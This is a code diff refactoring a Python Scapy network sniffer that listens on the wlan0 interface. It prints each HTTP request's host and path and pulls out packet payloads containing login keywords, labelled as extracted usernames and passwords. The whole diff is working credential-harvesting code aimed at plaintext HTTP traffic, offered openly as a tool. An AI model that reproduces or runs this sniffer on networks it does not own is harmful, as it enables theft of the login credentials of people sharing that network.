@@ -3,6 +3,18 @@
 import scapy.all as scapy
 from scapy.layers import http
 
+def extracting_credentials(packets):
+    if packets.haslayer(scapy.Raw):  # This will check for if the packet has a raw layer
+        loader = packets[scapy.Raw].load
+        # Creating wordlist to check for username and password fields and iterate each word in the for loop
+        wordlist = ["user", "uname", "usr", "username", "password", "pass", "pwd", "login", "lgn_Button"]
+        for key in wordlist:
+            if key in loader:  # if the key is found in the loader variable, print the statement once
+                return loader
+
+def fetching_url(packets):
+    return packets[http.HTTPRequest].Host + packets[http.HTTPRequest].Path # capture host & path
+
 def sniffer(interface):
     # prn is callback function, thus this would allow to callback the function every time a packet is captured.
     scapy.sniff(iface=interface, store=False, prn=sniffed_packet)
@@ -10,16 +22,13 @@ def sniffer(interface):
 # This function would be called in the prn of the sniffer function and filter data i.e. from http websites
 def sniffed_packet(packets):
     if packets.haslayer(http.HTTPRequest): # This will check for http layer
-        url = packets[http.HTTPRequest].Host + packets[http.HTTPRequest].Path # capture host & path & then print it
-        print(url)
-        if packets.haslayer(scapy.Raw): # This will check for if the packet has a raw layer
-            loader = packets[scapy.Raw].load
-            # Creating wordlist to check for username and password fields and iterate each word in the for loop
-            wordlist = ["user", "uname", "usr", "username", "password", "pass", "pwd", "login", "lgn_Button"]
-            for key in wordlist:
-                if key in loader: # if the key is found in the loader variable, print the statement once
-                    print(loader)
-                    break
+        url = fetching_url(packets) # calling out the fetching_url function and appending to a variable
+        print("[+] HTTP Request >> " + url)
+
+        login_info = extracting_credentials(packets)
+        if login_info:
+            print("\n\n[+] Extracting Username/Passwords >> " + login_info + "\n\n")
+
 
 # Capturing data from wlan0 interface
 sniffer("wlan0")
